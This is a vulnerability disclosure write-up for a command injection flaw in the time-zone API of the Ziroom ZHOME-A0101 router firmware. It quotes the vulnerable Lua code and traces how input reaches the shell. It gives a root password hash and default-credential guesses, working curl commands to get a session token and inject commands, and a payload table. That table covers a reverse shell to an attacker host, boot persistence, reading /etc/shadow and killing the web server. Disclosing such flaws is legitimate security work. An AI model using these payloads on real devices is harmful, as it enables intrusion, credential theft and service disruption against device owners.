# Command Injection Vulnerability in ZHOME ZH-A0101 set_time_zone via `zonename`

## Overview

- **Vendor:** Ziroom
- **Product:** ZHOME-A0101
- **Firmware Version:** 1.0.1.0, Build 202004151405
- **Platform:** OpenWrt / MediaTek MT7621, MIPS32
- **Vulnerability Type:** Command Injection
- **Affected Endpoint:** `POST /api/ZRFirmware/set_time_zone`
- **Affected Parameter:** `zonename`
- **Authentication Requirement:** HTTP Basic Auth as `root`
- **Severity:** Critical

## Vulnerability Information

| Item                | Detail                                                   |
| ------------------- | -------------------------------------------------------- |
| File                | `usr/lib/lua/luci/controller/api/zrFirmware.lua`         |
| Function            | `set_time_zone()`                                        |
| Code Location       | line 443-475                                             |
| Injection Location  | line 452, line 453                                       |
| Endpoint            | `POST /api/ZRFirmware/set_time_zone`                     |
| Injection Parameter | `zonename`                                               |
| Injection Method    | `;` command separator executed through `LuciUtil.exec()` |
| Authentication      | HTTP Basic Auth (`root`)                                 |

## Vulnerable Code

![image.png](https://cdn.nlark.com/yuque/0/2026/png/25400303/1785220518995-553d31b6-4157-4736-b095-5c77a8bce7bd.png?x-oss-process=image%2Fformat%2Cwebp)

```lua
-- zrFirmware.lua line 443-475
function set_time_zone()
    LuciHttp.prepare_content("application/json")
    local ZRFun = require("luci.model.ZRapi.common.ZRFunction")
    local LuciUci = require("luci.model.uci")
    local uciCursor = LuciUci.cursor()
    local result = {code=0}

    local zonename = LuciHttp.formvalue("zonename")
    local hostname = LuciHttp.formvalue("hostname")
    if ZRFun.isStrNil(hostname) then hostname = "ZR" end

    local cmd = string.format(
        "grep -w %s /usr/lib/lua/luci/sys/zoneinfo/tzdata.lua |awk '{print $3}'",
        zonename
    )
    local tz = ZRFirmwareFun.trim(LuciUtil.exec(cmd))

    if not ZRFun.isStrNil(zonename) and not ZRFun.isStrNil(tz) then
        local expr, tblist = '', {}
        expr = string.format("uci set system.@system[0].hostname=%s", hostname)
        table.insert(tblist, expr)
        expr = string.format("uci set system.@system[0].zonename=%s", zonename)
        table.insert(tblist, expr)
        expr = string.format("uci set system.@system[0].timezone=%s", tz)
        table.insert(tblist, expr)
        for _, v in pairs(tblist) do
            v = v .. " &>/dev/null "
            os.execute(v)
        end
        uciCursor:commit("system")
        luci.sys.hostname(hostname)
        os.execute("echo " .. tz .. " > /etc/TZ")
    else
        result["code"] = 1101
        return_error(result)
    end
    luci.http.write_json(result)
end
```

The `zonename` value is directly concatenated into a shell pipeline:

```sh
grep -w <zonename> /usr/lib/lua/luci/sys/zoneinfo/tzdata.lua | awk '{print $3}'
```

This command is executed through `LuciUtil.exec()`, which ultimately reaches `io.popen()` and `/bin/sh`. Because no quoting or escaping is applied, shell metacharacters inside `zonename` are interpreted by the shell.

## Injection Analysis

### Input Flow

```text
LuciHttp.formvalue("zonename")
    |
    v
string.format("grep -w %s .../tzdata.lua |awk ...", zonename)
    |
    v
LuciUtil.exec(cmd)
    |
    v
io.popen(cmd)
    |
    v
/bin/sh -c "..."
```

### Normal Request

```text
zonename = Asia/Shanghai
```

Constructed command:

```sh
grep -w Asia/Shanghai /usr/lib/lua/luci/sys/zoneinfo/tzdata.lua |awk '{print $3}'
```

### Injected Request

```text
zonename = Asia/Shanghai;touch /tmp/zonename_rce
```

Constructed command:

```sh
grep -w Asia/Shanghai;touch /tmp/zonename_rce /usr/lib/lua/luci/sys/zoneinfo/tzdata.lua |awk '{print $3}'
```

The semicolon causes the shell to split the string into separate commands. The injected command runs during `LuciUtil.exec()` before the later `isStrNil(tz)` check is evaluated.

## Execution Behavior

The important detail is that command execution happens at the first sink:

```text
T1: LuciUtil.exec(cmd) is called
T2: /bin/sh executes all semicolon-separated commands
T3: injected command already completes
T4: function receives empty/invalid tz result
T5: code enters error branch and returns code 1101
```

So even if the API returns an error, the injected command may already have run successfully.

## Exploit Chain

```text
Attacker
 |
 |-- Step 1: Obtain the root credential.
 |           Method A: recover the MD5 password hash from /etc/shadow
 |           Hash: $1$SD.FRa1K$D8O0ttaPTFvEs0i.0W.Co.
 |           Method B: try common default credentials
 |
 |-- Step 2: Log in and obtain sysauth cookie plus stok.
 |
 |-- Step 3: Send an authenticated request.
 |           URL:
 |           /cgi-bin/luci/;stok=<STOK>/api/ZRFirmware/set_time_zone
 |           Body:
 |           zonename=<PAYLOAD>&hostname=normal
 |
 |-- Step 4: Inject through the zonename parameter.
 |           Example pattern:
 |           zonename=Asia/Shanghai;<COMMAND>
 |
 `-- Step 5: Verify the side effect through a trusted administrative channel.
```

## Trigger Request

### Obtain `stok`

```bash
curl -s --noproxy "*" -c cookies.txt -X POST \
  "http://192.168.18.1/cgi-bin/luci" \
  -d "username=root&password=admin" \
  -L -D headers.txt

STOK=$(grep stok headers.txt | sed 's/.*stok=//;s/\r//;s/\/.*//')
```

### Send the Request

```bash
curl -s --noproxy "*" -b cookies.txt -X POST \
  --data-urlencode "zonename=Asia/Shanghai;touch /tmp/zonename_rce_test" \
  --data-urlencode "hostname=normalhost" \
  "http://192.168.18.1/cgi-bin/luci/;stok=${STOK}/api/ZRFirmware/set_time_zone"
```

Observed API response from the supplied analysis:

```json
{ "msg": "set time failed", "code": 1101 }
```

This error response does not prove the command failed. It only indicates that the later timezone-processing branch did not complete successfully.

![image.png](https://cdn.nlark.com/yuque/0/2026/png/25400303/1785220739607-b7d13127-15a0-4596-be73-b965de76e5de.png?x-oss-process=image%2Fformat%2Cwebp)

## Exploitation Scenarios

| Scenario             | Payload Pattern in `zonename`                   | Description                   |
| -------------------- | ----------------------------------------------- | ----------------------------- |
| Create file          | `Asia/Shanghai;touch /tmp/pwned`                | Verify command execution      |
| Write output         | `Asia/Shanghai;id>/tmp/id.txt`                  | Save command output to a file |
| Reverse shell        | `Asia/Shanghai;nc attacker.com 4444 -e /bin/sh` | Requires `nc` on the device   |
| Persistence          | `Asia/Shanghai;echo 'backdoor'>>/etc/rc.local`  | Execute on boot               |
| Read sensitive files | `Asia/Shanghai;cat /etc/shadow>/tmp/s.txt`      | Collect credentials           |
| Kill process         | `Asia/Shanghai;killall uhttpd`                  | Stop the web service          |





